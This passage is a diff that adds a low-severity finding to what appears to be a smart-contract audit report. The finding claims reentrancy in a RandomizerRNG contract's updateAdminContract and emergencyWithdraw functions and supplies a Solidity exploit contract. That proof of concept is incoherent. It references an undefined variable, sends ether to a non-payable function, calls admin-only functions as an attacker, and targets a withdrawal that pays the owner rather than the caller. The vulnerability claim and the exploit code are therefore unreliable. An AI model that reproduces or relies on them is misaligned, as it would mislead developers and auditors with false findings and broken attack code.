@@ -455,3 +455,69 @@ Checks-Effects-Interactions should be applied to the functions.
 Balance updates should be made at the beginning of the call.
 The actual call should be made at the end of the function.
 So that the balance is already updated first and reentrancy is not possible.
+## [L-09] Reentrnacy in RandomizerRNG contract
+## Impact
+The reentrancy vulnerability uses the attack contract to call into the victim contract several times before the victim contract's balance updates.
+Hence allowing the attacker to withdraw e.g. 2 ether when they only deposited 1 ether.
+Which means double entry counting duplicate withdrawals for only one genuine withdrawal.
+## Proof of Concept
+
+**Vulnerable updateAdminContract function to reentrancy**
+```sol
+// Ln 61-64
+    function updateAdminContract(address _newadminsContract) public FunctionAdminRequired(this.updateAdminContract.selector) {
+        require(INextGenAdmins(_newadminsContract).isAdminContract() == true, "Contract is not Admin");
+        adminsContract = INextGenAdmins(_newadminsContract);
+    }
+```
+**Vulnerable emergencyWithdraw function to reentrancy**
+```sol
+// Ln 79-84
+    function emergencyWithdraw() public FunctionAdminRequired(this.emergencyWithdraw.selector) {
+        uint balance = address(this).balance;
+        address admin = adminsContract.owner();
+        (bool success, ) = payable(admin).call{value: balance}("");
+        emit Withdraw(msg.sender, success, balance);
+    }
+```
+**Exploit Reentrancy**
+```sol
+// SPDX-License-Identifier: MIT
+
+pragma solidity >=0.8.19;
+
+import "./RandomizerRNG.sol";
+
+contract tRandomizerRNG {
+
+   RandomizerRNG public x1;
+
+   constructor(RandomizerRNG _x1) {
+
+      x1 = RandomizerRNG(_x1);
+
+   }
+
+   function testReenEnter() public payable {
+
+      x1.updateAdminContract(address(_x1));
+      x1.emergencyWithdraw{value: 2 ether}();
+
+   }
+
+   receive() external payable {
+
+      msg.sender.transfer(payable(address(_x1)).balance);
+
+   }
+
+   }
+```
+## Tools Used
+VS Code.
+## Recommended Mitigation Steps
+All functions that are not internal and are making a call should have a reentrancy guard added to them.
+Checks-Effects-Interactions should be applied to the functions. 
+Balance updates should be made at the beginning of the call.
+The actual call should be made at the end of the function.
+So that the balance is already updated first and reentrancy is not possible.
